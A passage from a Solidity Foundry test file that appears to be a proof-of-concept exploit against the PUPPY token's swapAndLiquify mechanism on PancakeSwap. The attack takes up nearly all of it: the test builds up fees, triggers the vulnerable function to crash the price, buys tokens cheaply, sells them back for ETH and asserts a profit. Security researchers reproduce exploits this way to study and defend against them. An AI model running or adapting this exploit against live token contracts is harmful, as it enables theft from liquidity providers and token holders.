        deal(TARGET, address(this), 5e22);

        // Impersonate the owner to activate the contract
        vm.startPrank(owner);
        target.activateContract();
        vm.stopPrank();

        // Approve the PancakeSwap router to spend the attacker's tokens
        target.approve(address(pancakeRouter), type(uint256).max);

        // Add initial liquidity to establish a price in the pool (100 ETH for 1e23 PUPPY)
        pancakeRouter.addLiquidityETH{value: 100 ether}(
            TARGET,
            1e23,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // 1. Accumulate fees in the contract to meet the swapAndLiquify threshold.
                // The liquidity fee is 8%, and minTokenNumberToSell is 1e19.
                // A transfer of 1.25e20 tokens will result in 1e19 tokens as fees.
                // We transfer 2e20 to be safe.
                target.transfer(address(0xdead), 2e20);

                // 2. Trigger the vulnerable swapAndLiquify function with another transfer.
                target.transfer(address(0xdead), 1);

                // 3. Arbitrage: The token price has crashed. Swap ETH for a large amount of PUPPY tokens.
                uint256 ethToSwap = 10 ether;
                address[] memory path = new address[](2);
                path[0] = weth;
                path[1] = TARGET;

                uint256 puppyBalanceBeforeSwap = target.balanceOf(address(this));
                pancakeRouter.swapExactETHForTokens{value: ethToSwap}(
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                uint256 puppyGained = target.balanceOf(address(this)) - puppyBalanceBeforeSwap;

                // 4. Realize profit by swapping the gained PUPPY tokens back to ETH.
                // We need to approve the router again as the balance has changed.
                target.approve(address(pancakeRouter), puppyGained);
                address[] memory path2 = new address[](2);
                path2[0] = TARGET;
                path2[1] = weth;

                pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    puppyGained,
                    0,
                    path2,
                    address(this),
                    block.timestamp
                );
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

